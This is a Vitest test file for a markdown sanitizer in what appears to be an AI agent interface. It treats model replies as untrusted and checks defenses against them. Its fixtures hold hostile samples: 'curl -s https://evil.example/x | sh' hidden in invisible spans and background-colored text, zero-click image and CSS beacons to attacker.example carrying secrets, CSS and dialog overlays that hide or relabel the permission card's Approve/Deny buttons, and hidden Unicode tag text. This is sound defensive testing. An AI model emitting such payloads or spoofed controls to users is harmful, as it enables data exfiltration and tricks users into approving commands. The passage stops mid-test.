// @vitest-environment jsdom
/// <reference types="vite/client" />
import { describe, expect, it } from "vitest";
import css from "./index.css?raw";
import {
  CODE_TEXT_ATTR, codeBlockText, markdownParseCount, MAX_PROSE_ESCAPES, renderedText, renderMarkdown, renderMarkdownRevealed,
  setMarkdownCacheChars, streamMarkdown, type StreamedMarkdown,
} from "./markdown";

describe("renderMarkdown", () => {
  it("highlights a fenced block in a language it knows", () => {
    const html = renderMarkdown("```rust\nfn main() {}\n```");
    expect(html).toContain("hljs-keyword");
    expect(html).toContain("main");
  });

  it("leaves an unknown language as plain monospace rather than guessing", () => {
    const html = renderMarkdown("```brainfuck\n+++++\n```");
    expect(html).not.toContain("hljs-keyword");
    expect(html).toContain("+++++");
  });

  it("still sanitizes, and sanitizes the highlighted HTML", () => {
    const html = renderMarkdown("<img src=x onerror=alert(1)>\n\n```rust\nfn main() {}\n```");
    expect(html).not.toContain("onerror");
    expect(html).toContain("hljs-keyword");
  });

  it("sanitizes AFTER markdown parsing, not before -- a URL only dangerous once rendered as an anchor", () => {
    // "[x](javascript:alert(1))" is inert as SOURCE TEXT -- there is no HTML in it yet for
    // DOMPurify to act on. marked turns it into `<a href="javascript:alert(1)">x</a>`, which is
    // dangerous. `DOMPurify.sanitize(marked.parse(text))` (the real order) strips the href
    // entirely; `marked.parse(DOMPurify.sanitize(text))` (parse-then-sanitize swapped, i.e.
    // sanitize-then-parse) sanitizes the harmless source string and hands its output straight to
    // marked with no sanitize afterwards, so the dangerous href survives untouched.
    //
    // Swapping the order lets the dangerous href through while the other tests above still pass:
    // this is the one test in this file that pins the ORDER, not just that sanitizing happens.
    const html = renderMarkdown("[x](javascript:alert(1))");
    expect(html).not.toContain("javascript:");
  });

  it("wraps a table in its own sideways scroller", () => {
    const html = renderMarkdown("| a | b |\n|---|---|\n| 1 | 2 |");
    expect(html).toMatch(/<div class="table-scroll"><table>[\s\S]*<\/table><\/div>/);
  });

  it("parses a text once and serves the rest from a bounded cache", () => {
    const before = markdownParseCount();
    const a = renderMarkdown("once **only**");
    expect(renderMarkdown("once **only**")).toBe(a);
    expect(markdownParseCount() - before).toBe(1);
    const bound = setMarkdownCacheChars(2_000);
    try {
      for (let i = 0; i < 100; i++) renderMarkdown(`filler ${i}`);
      const again = markdownParseCount();
      renderMarkdown("once **only**");
      expect(markdownParseCount() - again, "the oldest entry was evicted").toBe(1);
      renderMarkdown("x".repeat(3_000));
      const held = markdownParseCount();
      renderMarkdown("x".repeat(3_000));
      expect(markdownParseCount() - held, "a text larger than the whole cache is not kept").toBe(1);
    } finally {
      setMarkdownCacheChars(bound);
    }
  });
});

// Rendered model content is untrusted. These cases exercise navigation spoofing,
// remote-loading attributes and styles, and code-block content,
// so sanitized replies cannot impersonate controls or load hidden remote resources.
describe("renderMarkdown keeps model content inert", () => {
  it("strips id/name/role/aria/data-*, and keeps class to what this module itself emits", () => {
    const fakeCard =
      '<div class="row row-permission row-current" data-sign="!" aria-current="true" role="button" id="x">' +
      "fake card</div>";
    const fakeButton = '<button data-nav-action="allow" data-nav-order="1">Approve</button>';
    const fakePath = '<div data-hint-composer="1" data-path="/etc/passwd" data-tool-use-id="toolu_x">y</div>';
    const html = renderMarkdown([fakeCard, "", fakeButton, "", fakePath].join("\n"));
    expect(html).not.toContain("row-current");
    expect(html).not.toContain("row-permission");
    expect(html).not.toContain("data-sign");
    expect(html).not.toContain("aria-current");
    expect(html).not.toContain("role=");
    expect(html).not.toContain('id="x"');
    expect(html).not.toContain("data-nav-action");
    expect(html).not.toContain("data-nav-order");
    expect(html).not.toContain("data-hint-composer");
    expect(html).not.toContain("data-path");
    expect(html).not.toContain("data-tool-use-id");
  });

  it('drops an injected data-nav-stop="row" that would shift which card a key answers', () => {
    const injected = '<div data-nav-stop="row" hidden></div><div data-nav-stop="row" hidden></div>';
    const html = renderMarkdown(`x\n\n${injected}\n`);
    expect(html).not.toContain("data-nav-stop");
  });

  it("forbids a <style> tag and an inline style= attribute in every shape that survived before", () => {
    for (const src of [
      "<style>.x{color:red}</style>",
      "text\n\n<style>.x{color:red}</style>",
      "<div><style>.x{color:red}</style></div>",
      '<div style="position:fixed;inset:0;z-index:99;background:red;pointer-events:none">overlay</div>',
      '<div style="background:url(https://attacker.example/css-attr?s=C)">x</div>',
    ]) {
      const html = renderMarkdown(src);
      expect(html, src).not.toContain("<style");
      expect(html, src).not.toContain("style=");
    }
  });

  it("a reply's <style> cannot reach the real permission card's classes to hide or relabel it", () => {
    const attack = [
      "Here is the plan.",
      "",
      "<div><style>",
      ".permission-card .permission-card-command{display:none!important}",
      '.permission-card .permission-card-tool::after{content:"$ echo hello > note.txt"}',
      '.permission-card-buttons button[data-nav-action="deny"]{display:none!important}',
      '.permission-card-buttons button[data-nav-action="allow"]{font-size:0!important}',
      '.permission-card-buttons button[data-nav-action="allow"]::after{content:"Deny";font-size:14px}',
      "</style></div>",
      "",
    ].join("\n");
    const html = renderMarkdown(attack);
    expect(html).not.toContain("<style");
    expect(html).not.toContain("permission-card");
    expect(html).not.toContain("data-nav-action");
  });

  it("drops every zero-click remote-load vector, with no attacker URL surviving", () => {
    const vectors = [
      '<img src="https://attacker.example/i2?s=A" width="0" height="0">',
      '<img srcset="https://attacker.example/srcset?s=B 1x">',
      '<div style="background:url(https://attacker.example/css-attr?s=C)">x</div>',
      "text\n\n<style>@import url(https://attacker.example/import?s=D);" +
        ".x{background:url(https://attacker.example/css-rule?s=E)}</style>",
      '<video poster="https://attacker.example/poster?s=F"></video>',
      '<audio src="https://attacker.example/audio?s=G" preload="auto"></audio>',
      '<picture><source srcset="https://attacker.example/source?s=H"><img src="x.png"></picture>',
      '<input type="image" src="https://attacker.example/input?s=J">',
      '<object data="https://attacker.example/obj?s=K"></object>',
      '<iframe src="https://attacker.example/frame?s=L"></iframe>',
      '<svg><image href="https://attacker.example/svgimg?s=M"></svg>',
    ];
    for (const src of vectors) {
      const html = renderMarkdown(src);
      expect(html, src).not.toContain("attacker.example");
    }
  });

  it("a markdown image renders as a link with the alt text and URL, never an auto-loading <img>", () => {
    const html = renderMarkdown("![diagram](https://attacker.example/pixel?secret=CONFIDENTIAL_TEXT)");
    expect(html).not.toContain("<img");
    expect(html).toContain('href="https://attacker.example/pixel?secret=CONFIDENTIAL_TEXT"');
    expect(html).toContain("https://attacker.example/pixel?secret=CONFIDENTIAL_TEXT");
    expect(html).toContain("diagram");
  });

  it("code blocks keep their highlight classes -- the allowlist does not eat legitimate output", () => {
    const html = renderMarkdown("```rust\nfn main() {}\n```");
    expect(html).toContain("hljs-keyword");
    expect(html).toContain('class="code-block"');
  });

  it("a table keeps its scroll wrapper class -- the allowlist does not eat legitimate output", () => {
    const html = renderMarkdown("| a | b |\n|---|---|\n| 1 | 2 |");
    expect(html).toContain('class="table-scroll"');
  });
});

// The sanitizer must also preserve safe markup while refusing remote-loading
// attributes (including the `background=` load vector), GFM checkboxes
// must survive, image alt text must not be double-escaped, a badge-style `[![img](url)](url)` keeps its
// real link, and the class allowlist keeps highlight.js's own `class_`/`function_` modifiers.
describe("renderMarkdown: further remote-loading attributes, with safe markup kept", () => {
  it("drops a legacy background= attribute -- WebKitGTK loads it as a background-image with no click", () => {
    const vectors = [
      '<table background="https://attacker.example/tbg"><tr><td>x</td></tr></table>',
      'x\n\n<table><tr><td background="https://attacker.example/tdbg">x</td></tr></table>',
    ];
    for (const src of vectors) {
      const html = renderMarkdown(src);
      expect(html, src).not.toContain("attacker.example");
      expect(html, src).not.toContain("background");
    }
  });

  it("forbids the MathML namespace -- the same zero-click shape as the svg <image href> vector", () => {
    const html = renderMarkdown('<math><mglyph src="https://attacker.example/mglyph"></mglyph></math>');
    expect(html).not.toContain("attacker.example");
    expect(html).not.toContain("<math");
  });

  it("keeps a GFM task list's done/not-done distinction instead of silently dropping both to the same <li>", () => {
    const html = renderMarkdown("- [ ] todo\n- [x] done");
    expect(html).not.toContain("<input");
    expect(html).toContain("[ ] todo");
    expect(html).toContain("[x] done");
  });

  it("does not double-escape an image's alt text (marked already escapes it before this module sees it)", () => {
    const html = renderMarkdown("![a & b <c>](https://example.com/x)");
    // The single escaping marked itself applies is expected and fine; a SECOND layer
    // (`&amp;amp;`/`&amp;lt;`) is the bug -- it renders literally on screen, not decoded.
    expect(html).not.toContain("&amp;amp;");
    expect(html).not.toContain("&amp;lt;");
    expect(html).not.toContain("&amp;gt;");
    expect(html).toContain("a &amp; b &lt;c&gt;");
  });

  it("a badge link (`[![badge](img-url)](real-url)`) keeps its real, clickable outer link", () => {
    const html = renderMarkdown("[![badge](https://img.example/b.svg)](https://proj.example/)");
    const div = document.createElement("div");
    div.innerHTML = html;
    const anchors = div.querySelectorAll("a");
    // Exactly one anchor: the badge's own <a> must not survive as a second, sibling anchor that
    // steals the visible/clickable area from the real link (reproduced: two anchors, the first
    // -- the real one -- empty and invisible, the second pointing at the badge image instead).
    expect(anchors.length).toBe(1);
    expect(anchors[0].getAttribute("href")).toBe("https://proj.example/");
    expect(anchors[0].textContent).toContain("badge");
  });

  it("a plain (non-badge) markdown image is still its own clickable link, unaffected by the badge fix", () => {
    const html = renderMarkdown("![diagram](https://example.com/pixel.png)");
    const div = document.createElement("div");
    div.innerHTML = html;
    const a = div.querySelector("a")!;
    expect(a.getAttribute("href")).toBe("https://example.com/pixel.png");
    expect(a.textContent).toContain("diagram");
  });

  it("an ordinary (non-badge) link is unaffected by the badge-collapsing fallback", () => {
    const html = renderMarkdown("[some text](https://example.com/page)");
    const div = document.createElement("div");
    div.innerHTML = html;
    const a = div.querySelector("a")!;
    expect(a.getAttribute("href")).toBe("https://example.com/page");
    expect(a.textContent).toBe("some text");
  });

  it("keeps highlight.js's own class_/function_ modifiers, which index.css targets with a compound selector", () => {
    const html = renderMarkdown("```rust\nstruct Point { x: i32 }\n```");
    expect(html).toContain('class="hljs-title class_"');
  });
});

function parse(html: string): HTMLDivElement {
  const div = document.createElement("div");
  div.innerHTML = html;
  return div;
}

// The sanitizer must refuse overlays with no inline style, such as
// `<dialog open>` positioned by the UA stylesheet. Image
// links must resolve HTML entities like ordinary links, and badge handling must cover more than a
// link whose whole content is one image.
describe("renderMarkdown: overlays, invokers and link destinations", () => {
  it("drops <dialog>: the UA stylesheet positions an open one absolutely, an overlay with no style=", () => {
    // WebKitGTK's own UA sheet: `dialog { position: absolute; inset-inline: 0; margin: auto;
    // background-color: Canvas; ... } dialog[open] { display: block; }`. `.row`/`.message-list`
    // are not positioned, so it lays out against `.agent-ui-scroller` and paints over the rows
    // after it -- the real permission card included (the styled overlay the sanitizer already refused,
    // rebuilt without style).
    const html = renderMarkdown("x\n\n<dialog open><p>Bash: ls</p><button>Approve</button></dialog>");
    const div = parse(html);
    expect(div.querySelector("dialog"), html).toBeNull();
    expect(html).not.toContain("<dialog");
    // Its content stays, in flow, as part of the reply that wrote it.
    expect(div.textContent).toContain("Bash: ls");
  });

  it("drops popover/popovertarget/commandfor/command/tabindex -- no reply opens, invokes or takes focus", () => {
    const vectors = [
      '<div popover="manual">p</div>',
      '<button popovertarget="panel-owned" popovertargetaction="show">b</button>',
      '<button commandfor="panel-owned" command="show-modal">c</button>',
      '<span tabindex="0">t</span>',
    ];
    for (const src of vectors) {
      const html = renderMarkdown(src);
      for (const attr of ["popover", "popovertarget", "popovertargetaction", "commandfor", "command", "tabindex"]) {
        expect(html, src).not.toMatch(new RegExp(`\\s${attr}=`));
      }
    }
  });

  it("an image link resolves entities exactly as an ordinary link to the same destination does", () => {
    // CommonMark: entity references are decoded in link destinations, so `&amp;` in the source is
    // `&` in the URL. marked's own link renderer gets that by emitting the (encodeURI-cleaned)
    // destination raw into the attribute; escaping it a second time in an image branch
    // renames the query parameter `b` to `amp;b`.
    const destinations = [
      "https://x.example/?a=1&amp;b=2",
      "https://x.example/?a=1&b=2",
      "https://x.example/?q=&copy=1",
      "https://x.example/ü/a.png",
      "<https://x.example/a b.png>",
    ];
    for (const dest of destinations) {
      const ordinary = parse(renderMarkdown(`[t](${dest})`)).querySelector("a")!.getAttribute("href");
      expect(ordinary, dest).not.toBeNull();
      const image = parse(renderMarkdown(`![d](${dest})`)).querySelector("a")!;
      expect(image.getAttribute("href"), dest).toBe(ordinary);
      // The link shows the full URL -- the SAME string it goes to, not a differently-decoded one.
      expect(image.textContent, dest).toBe(`d: ${ordinary}`);
      const badge = parse(renderMarkdown(`[![b](https://i.example/i.svg)](${dest})`)).querySelectorAll("a");
      expect(badge.length, dest).toBe(1);
      expect(badge[0].getAttribute("href"), dest).toBe(ordinary);
    }
    expect(parse(renderMarkdown("[t](https://x.example/?a=1&amp;b=2)")).querySelector("a")!.getAttribute("href"))
      .toBe("https://x.example/?a=1&b=2");
  });

  it("an image anywhere inside a link's text is part of that ONE link, never a second anchor to the image", () => {
    const sources = [
      "[see ![b](https://i.example/x.svg)](https://proj.example/)",
      "[see *em ![b](https://i.example/x.svg)*](https://proj.example/)",
      "[![a](https://i.example/a.svg) and ![b](https://i.example/b.svg)](https://proj.example/)",
    ];
    for (const src of sources) {
      const anchors = parse(renderMarkdown(src)).querySelectorAll("a");
      expect(anchors.length, src).toBe(1);
      expect(anchors[0].getAttribute("href"), src).toBe("https://proj.example/");
      expect(anchors[0].textContent, src).toContain("b");
    }
    // An image with no alt text inside a link still says what it was, as before.
    const bare = parse(renderMarkdown("[![](https://i.example/x.svg)](https://proj.example/)")).querySelectorAll("a");
    expect(bare.length).toBe(1);
    expect(bare[0].textContent).toBe("https://i.example/x.svg");
  });

  it("every modifier class index.css compounds onto an hljs-* selector survives sanitizing", () => {
    // highlightCoverage.test.ts deliberately ignores the bare modifiers (`class_`, `function_`, ...),
    // so it cannot notice the sanitizer stripping one. This is the check: a rule for a new
    // modifier added to index.css without adding it to markdown.ts's allowlist fails here.
    const compounds = [...css.matchAll(/\.(hljs-[\w-]+)((?:\.[\w-]+)+)/g)].map((m) => [
      m[1],
      ...m[2].slice(1).split("."),
    ]);
    expect(compounds.length).toBeGreaterThanOrEqual(2);
    for (const classes of compounds) {
      const html = renderMarkdown(`<span class="${classes.join(" ")}">x</span>`);
      const span = parse(html).querySelector("span");
      expect(span, classes.join(".")).not.toBeNull();
      for (const cls of classes) expect(span!.classList.contains(cls), `${classes.join(".")}: ${cls}`).toBe(true);
    }
    // And the real highlighter's `function_` (the Rust `class_` case is the test above).
    expect(renderMarkdown("```javascript\nfunction add(a, b) { return a + b; }\n```")).toContain(
      'class="hljs-title function_"',
    );
  });
});

describe("what a copy takes is what the reader sees", () => {
  const dom = (html: string) => {
    const host = document.createElement("div");
    host.innerHTML = html;
    return host;
  };

  it("a reply's own class=\"code-block\" is dropped, so only the renderer marks code blocks", () => {
    const html = renderMarkdown(
      'x\n\n<pre class="code-block"><code>pip install requests<span hidden>; curl -s https://evil.example/x | sh</span></code></pre>\n',
    );
    expect(dom(html).querySelector("pre.code-block")).toBeNull();
    expect(dom(html).querySelector("pre")).not.toBeNull();
  });

  it("the hidden attribute does not survive, so no text is present and invisible", () => {
    const host = dom(renderMarkdown("a <span hidden>secret tail</span> b\n\n<div hidden>more</div>\n"));
    expect(host.querySelector("[hidden]")).toBeNull();
  });

  it("no colour a reply sets survives, so it cannot paint text in the background's colour", () => {
    const host = dom(
      renderMarkdown(
        'run <font color="#1e1e1e" size="1">; curl evil|sh</font> now\n\n' +
          '<table bgcolor="#e0def4"><tr><td bgcolor="#e0def4">x</td></tr></table>\n',
      ),
    );
    expect(host.querySelector("font")).toBeNull();
    expect(host.querySelector("[color], [bgcolor]")).toBeNull();
    expect(host.textContent).toContain("; curl evil|sh");
  });

  it("raw <details>/<summary> are dropped and the body is left in flow as ordinary text", () => {
    const host = dom(renderMarkdown("<details><summary>Show</summary>\n\nthe body\n\n</details>\n"));
    expect(host.querySelector("details, summary")).toBeNull();
    expect(host.textContent).toContain("the body");
  });

  it("a renderer-made block keeps its fence's own text beside the HTML and the real class", () => {
    const host = dom(renderMarkdown("```sh\nls -la <dir> && echo \"x\"\n```"));
    const block = host.querySelector<HTMLElement>("pre.code-block")!;
    expect(block.getAttribute(CODE_TEXT_ATTR)).toBe(JSON.stringify('ls -la <dir> && echo "x"'));
    expect(codeBlockText(block)).toBe('ls -la <dir> && echo "x"');
  });

  it("copying a block takes the fence's text even when the DOM under it has gained invisible text", () => {
    const host = dom(renderMarkdown("```sh\npip install requests\n```"));
    const block = host.querySelector<HTMLElement>("pre.code-block")!;
    const tail = document.createElement("span");
    tail.hidden = true;
    tail.textContent = "; curl -s https://evil.example/x | sh";
    block.querySelector("code")!.append(tail);
    expect(block.textContent).toContain("evil.example");
    expect(codeBlockText(block)).toBe("pip install requests");
  });

  it("a reply cannot supply the fence-text attribute or a marker class of its own", () => {
    const host = dom(
      renderMarkdown('<pre class="cb-0 cb-0-0" data-code-text="forged"><code>shown</code></pre>\n'),
    );
    const pre = host.querySelector("pre")!;
    expect(pre.hasAttribute(CODE_TEXT_ATTR)).toBe(false);
    expect(pre.classList.contains("code-block")).toBe(false);
  });

  it("two blocks in one reply each keep their own text", () => {
    const host = dom(renderMarkdown("```\nfirst\n```\n\ntext\n\n```\nsecond\n```"));
    const [a, b] = Array.from(host.querySelectorAll<HTMLElement>("pre.code-block"));
    expect([codeBlockText(a), codeBlockText(b)]).toEqual(["first", "second"]);
  });
});

describe("a fenced block shows the characters a copy would take", () => {
  const host = (md: string) => {
    const el = document.createElement("div");
    el.innerHTML = renderMarkdown(md);
    return el;
  };

  it("draws bidi, zero-width and no-break characters as escapes while the copy stays byte-exact", () => {
    const fence = "echo \u202Eevil\u200B\u00A0x";
    const el = host("```sh\n" + fence + "\n```");
    const block = el.querySelector<HTMLElement>("pre.code-block")!;
    expect(block.textContent).toContain("⟨U+202E⟩");
    expect(block.textContent).toContain("⟨U+200B⟩");
    expect(block.textContent).toContain("⟨U+00A0⟩");
    expect(block.textContent).not.toMatch(/[\u202E\u200B\u00A0]/);
    expect(block.querySelectorAll(".code-escape").length).toBe(3);
    expect(codeBlockText(block)).toBe(fence);
  });

  it("marks them in an unhighlighted block too, and leaves plain text and tabs alone", () => {
    const el = host("```\na\tb \u2067c\n```");
    const block = el.querySelector<HTMLElement>("pre.code-block")!;
    expect(block.textContent).toContain("a\tb ⟨U+2067⟩c");
  });

  it("keeps the escape class only on a span that is an escape", () => {
    const el = host('<span class="code-escape">hello</span> <p class="code-escape">⟨U+200B⟩</p> <span class="code-escape">⟨U+200B⟩</span>');
    expect(el.querySelectorAll(".code-escape").length).toBe(1);
    expect(el.querySelector(".code-escape")!.textContent).toBe("⟨U+200B⟩");
  });

  it("lays the block out in character order", () => {
    expect(css).toMatch(/\.code-block,[^{]*\{[^}]*unicode-bidi:\s*bidi-override/);
  });
});

describe("what a reply cannot draw or link to", () => {
  const host = (md: string) => {
    const el = document.createElement("div");
    el.innerHTML = renderMarkdown(md);
    return el;
  };

  it("drops form controls, direction overrides and marquee, keeping their text", () => {
    const el = host(
      '<button>Approve</button><form action="x"><select><option>a</option></select><textarea>t</textarea>' +
        "<label>l</label><fieldset><legend>g</legend></fieldset><output>o</output><meter></meter><progress></progress>" +
        "<canvas></canvas><marquee>m</marquee><bdo dir=\"rtl\">abc</bdo><bdi>d</bdi>\n",
    );
    for (const tag of [
      "button", "form", "select", "option", "textarea", "label", "fieldset", "legend", "output",
      "meter", "progress", "canvas", "marquee", "bdo", "bdi",
    ]) {
      expect(el.querySelector(tag), tag).toBeNull();
    }
    expect(el.textContent).toContain("Approve");
    expect(el.textContent).toContain("abc");
  });

  it("drops dir, title, lang, spans, sizes and download", () => {
    const el = host(
      '<p dir="rtl" lang="ar" title="t">x</p><table><tr><td rowspan="9" colspan="9" width="900" height="900">c</td></tr></table>' +
        '<a href="https://example.com/f" download="f" title="other" ping="https://t.example/">l</a>\n',
    );
    expect(el.querySelector("[dir], [lang], [title], [rowspan], [colspan], [width], [height], [download], [ping]")).toBeNull();
    expect(el.querySelector("a")!.getAttribute("href")).toBe("https://example.com/f");
  });

  it("keeps web and mail links and a table's column alignment, drops tel, sms and other schemes", () => {
    const el = host(
      "[a](https://example.com) [b](mailto:x@example.com) [c](tel:+100) [d](sms:+100) [e](ftp://h/f) [f](xmpp:a@b)\n\n" +
        "| h |\n|:-:|\n| v |\n",
    );
    const hrefs = Array.from(el.querySelectorAll("a")).map((a) => a.getAttribute("href")).filter((h) => h !== null);
    expect(hrefs).toEqual(["https://example.com", "mailto:x@example.com"]);
    expect(el.textContent).toContain("c");
    expect(el.querySelector("th")!.getAttribute("align")).toBe("center");
  });

  it("drops a scheme holding digits, plus, dot or dash, and keeps relative links", () => {
    const el = host(
      "[a](h323:hello) [b](web+foo1:hello) [c](a.b-c+1:x) [d](z39.50s:x) [e](H323:hello) " +
        "[f](docs/a1.md) [g](page2.html) [h](#frag) [i](./v1:x) [j](docs/v1:x)\n",
    );
    const hrefs = Object.fromEntries(Array.from(el.querySelectorAll("a")).map((a) => [a.textContent, a.getAttribute("href")]));
    for (const dropped of ["a", "b", "c", "d", "e"]) expect(hrefs[dropped] ?? null, dropped).toBeNull();
    expect(hrefs).toMatchObject({ f: "docs/a1.md", g: "page2.html", h: "#frag", i: "./v1:x", j: "docs/v1:x" });
  });
});

it.each(["x\u0000y", "\uD800", 'quotes " & < >'])("keeps fenced text %j through a fresh HTML parse", (text) => {
  const host = document.createElement("div");
  host.innerHTML = renderMarkdown("```\n" + text + "\n```");
  expect(codeBlockText(host.querySelector("pre")!)).toBe(text);
});

it.each(["not JSON", "null", "42", "{}"])("falls back to rendered code for an invalid copy attribute %s", (value) => {
  const block = document.createElement("pre");
  block.innerHTML = "<code>visible code</code>";
  block.setAttribute(CODE_TEXT_ATTR, value);
  expect(codeBlockText(block)).toBe("visible code");
});

it.each([
  "`a\u200bb`",
  "<code>a\u200bb</code>",
  "<code>a&#x200b;b</code>",
  "<pre>a\u200bb</pre>",
  "<kbd>a\u200bb</kbd>",
  "<samp>a\u200bb</samp>",
  "<tt>a\u200bb</tt>",
  '<pre><code><span class="hljs-string">a\u200bb</span></code></pre>',
  "<code>a<code>\u200b</code>b</code>",
])("reveals hidden code characters in %s and copies the shown row text", (md) => {
  const el = document.createElement("div");
  el.innerHTML = renderMarkdown(md);
  expect(el.querySelectorAll(".code-escape")).toHaveLength(1);
  expect(el.querySelector("code, pre, kbd, samp, tt")!.textContent).toBe("a⟨U+200B⟩b");
  expect(renderedText(el).trim()).toBe("a⟨U+200B⟩b");
});

describe("renderMarkdownRevealed: what the page holds is what is revealed", () => {
  /** `s` spelled in Unicode tag characters (U+E0000 + its ASCII code). */
  const tags = (s: string) => [...s].map((c) => String.fromCodePoint(0xe0000 + c.codePointAt(0)!)).join("");
  const CANCEL = "\u{E007F}";
  const FLAG = "\u{1F3F4}";
  const escapeOf = (cp: number) => `⟨U+${cp.toString(16).toUpperCase().padStart(4, "0")}⟩`;
  const escapesIn = (html: string | null) => {
    const el = document.createElement("div");
    el.innerHTML = html!;
    return [...el.querySelectorAll(".code-escape")].map((e) => e.textContent);
  };
  /** The text the reader sees, outside the escapes. */
  const plainText = (html: string | null) => {
    const el = document.createElement("div");
    el.innerHTML = html!;
    for (const e of el.querySelectorAll(".code-escape")) e.remove();
    return el.textContent ?? "";
  };

  it("tag characters after a pictograph that are not a flag are each revealed", () => {
    const hidden = tags("delete checks");
    const html = renderMarkdownRevealed(`\u2705${hidden} Run the suite`);
    expect(escapesIn(html)).toEqual([...hidden].map((c) => escapeOf(c.codePointAt(0)!)));
    expect(plainText(html)).not.toMatch(/[\u{E0000}-\u{E007F}]/u);
  });

  it("the three recommended subdivision flags stay as written, as do ZWJ sequences", () => {
    const flags = ["gbeng", "gbsct", "gbwls"].map((code) => FLAG + tags(code) + CANCEL);
    const text = `Flags ${flags.join(" ")} and \u{1F468}\u200D\u{1F4BB} and \u{1F3F3}\uFE0F\u200D\u{1F308} \u{1F468}\u200D\u{1F9B0} \u{1F9D1}\u{1F3FB}\u200D\u{1F91D}\u200D\u{1F9D1}\u{1F3FC}`;
    const html = renderMarkdownRevealed(text);
    expect(escapesIn(html)).toEqual([]);
    for (const flag of flags) expect(html).toContain(flag);
  });

  it.each([
    ["a run with no CANCEL TAG", FLAG + tags("gbeng") + " x", tags("gbeng")],
    ["a valid subdivision that is not recommended", FLAG + tags("usca") + CANCEL, tags("usca") + CANCEL],
    ["a subdivision spelling a word", FLAG + tags("delete") + CANCEL, tags("delete") + CANCEL],
    ["an over-long run", FLAG + tags("gbengland") + CANCEL, tags("gbengland") + CANCEL],
    ["tags that are not lowercase letters or digits", FLAG + tags("GBENG") + CANCEL, tags("GBENG") + CANCEL],
    ["a flag's tags after another pictograph", "\u2705" + tags("gbeng") + CANCEL, tags("gbeng") + CANCEL],
    ["tags after a recommended flag", FLAG + tags("gbeng") + CANCEL + tags("gbsct") + CANCEL, tags("gbsct") + CANCEL],
    ["a lone CANCEL TAG after the black flag", FLAG + CANCEL, CANCEL],
  ])("%s is revealed, every tag character", (_name, text, revealed) => {
    const html = renderMarkdownRevealed(`Plan ${text} end`);
    expect(escapesIn(html)).toEqual([...revealed].map((c) => escapeOf(c.codePointAt(0)!)));
  });

  it("a joiner that does not join two pictographs is revealed", () => {
    expect(escapesIn(renderMarkdownRevealed("\u2705\u200Dship it"))).toEqual(["⟨U+200D⟩"]);
  });

  it("entity-encoded bidi controls are revealed, not decoded into active controls", () => {
    const html = renderMarkdownRevealed("Keep &#x202e;secret&#x202c; visible");
    expect(escapesIn(html)).toEqual(["⟨U+202E⟩", "⟨U+202C⟩"]);
    expect(plainText(html)).not.toMatch(/[\u202A-\u202E\u2066-\u2069]/);
  });

  it.each([
    ["decimal", "a&#8238;b&#8203;c", ["⟨U+202E⟩", "⟨U+200B⟩"]],
    ["hex, either case", "a&#X200F;b&#xfeff;c", ["⟨U+200F⟩", "⟨U+FEFF⟩"]],
    ["named", "a&rlm;b&lrm;c&zwj;d&zwnj;e&ZeroWidthSpace;f&NoBreak;g", ["⟨U+200F⟩", "⟨U+200E⟩", "⟨U+200D⟩", "⟨U+200C⟩", "⟨U+200B⟩", "⟨U+2060⟩"]],
    ["tag characters", "\u2705&#xE0064;&#xE0065;", ["⟨U+E0064⟩", "⟨U+E0065⟩"]],
    ["in a heading, a list and a link", "# a&#x2066;b\n\n- c&#x2067;d\n\n[e&#x2068;f](https://example.com)", ["⟨U+2066⟩", "⟨U+2067⟩", "⟨U+2068⟩"]],
  ])("%s character references are revealed", (_name, text, expected) => {
    expect(escapesIn(renderMarkdownRevealed(text))).toEqual(expected);
  });

  it("a flag written as character references is the same flag and stays", () => {
    const text = "&#x1F3F4;" + [..."gbsct"].map((c) => `&#x${(0xe0000 + c.codePointAt(0)!).toString(16)};`).join("") + "&#xE007F;";
    expect(escapesIn(renderMarkdownRevealed(text))).toEqual([]);
  });

  it("mixed: a flag stays, a hidden tag run, a literal and an encoded bidi control are revealed", () => {
    const flag = FLAG + tags("gbwls") + CANCEL;
    const html = renderMarkdownRevealed(`${flag} \u{1F525}${tags("rm")} keep \u202Eab &#x2067;cd and \`x\u200By\``);
    expect(escapesIn(html)).toEqual(["⟨U+E0072⟩", "⟨U+E006D⟩", "⟨U+202E⟩", "⟨U+2067⟩", "⟨U+200B⟩"]);
    expect(html).toContain(flag);
  });

  it("the escape cap counts the escapes code already holds", () => {
    const over = MAX_PROSE_ESCAPES + 1;
    expect(renderMarkdownRevealed("```\n" + "\u200b".repeat(over) + "\n```") === null, "a fenced block").toBe(true);
    expect(renderMarkdownRevealed("Plan `" + "\u200b".repeat(over) + "`") === null, "inline code").toBe(true);
    const half = "a\u200b".repeat(MAX_PROSE_ESCAPES / 2);
    expect(renderMarkdownRevealed("`" + half + "` and " + half + "\u200b") === null, "code and prose together").toBe(true);
    expect(escapesIn(renderMarkdownRevealed("`" + half + "` and " + half))).toHaveLength(MAX_PROSE_ESCAPES);
  });

  it.each([
    ["the Mongolian vowel separator", "Keep&#x180e;checks", ["⟨U+180E⟩"]],
    ["a soft hyphen", "Keep&shy;checks", ["⟨U+00AD⟩"]],
    ["the combining grapheme joiner", "Keep&#x034f;checks", ["⟨U+034F⟩"]],
    ["Hangul fillers", "a\u115Fb\u1160c\u3164d\uFFA0e", ["⟨U+115F⟩", "⟨U+1160⟩", "⟨U+3164⟩", "⟨U+FFA0⟩"]],
    ["variation selectors on letters", "a\uFE00b\uFE0Fc\u{E0100}d", ["⟨U+FE00⟩", "⟨U+FE0F⟩", "⟨U+E0100⟩"]],
    ["Mongolian selectors and shorthand format controls", "a\u180Bb\u180Fc\u{1BCA0}d\u{1BCA3}e", ["⟨U+180B⟩", "⟨U+180F⟩", "⟨U+1BCA0⟩", "⟨U+1BCA3⟩"]],
    ["invisible operators and deprecated format characters", "a\u2061b\u2065c\u206Ad\u206Fe", ["⟨U+2061⟩", "⟨U+2065⟩", "⟨U+206A⟩", "⟨U+206F⟩"]],
    ["interlinear annotation", "a\uFFF9b\uFFFAc\uFFFBd", ["⟨U+FFF9⟩", "⟨U+FFFA⟩", "⟨U+FFFB⟩"]],
    ["unassigned default-ignorables", "a\uFFF0b\u{E0000}c\u{E0080}d", ["⟨U+FFF0⟩", "⟨U+E0000⟩", "⟨U+E0080⟩"]],
    ["a control and a line separator", "a\u0007b\u2028c", ["⟨U+0007⟩", "⟨U+2028⟩"]],
  ])("%s in prose is revealed", (_name, text, expected) => {
    expect(escapesIn(renderMarkdownRevealed(text))).toEqual(expected);
  });

  it("emoji presentation and the other spaces stay as written", () => {
    const text = "\u2705\uFE0F done \u263A\uFE0E 1\uFE0F\u20E3 step\u00A0one\u202Ftwo\u3000three";
    expect(escapesIn(renderMarkdownRevealed(text))).toEqual([]);
  });

  it("the escape cap counts what the page holds", () => {
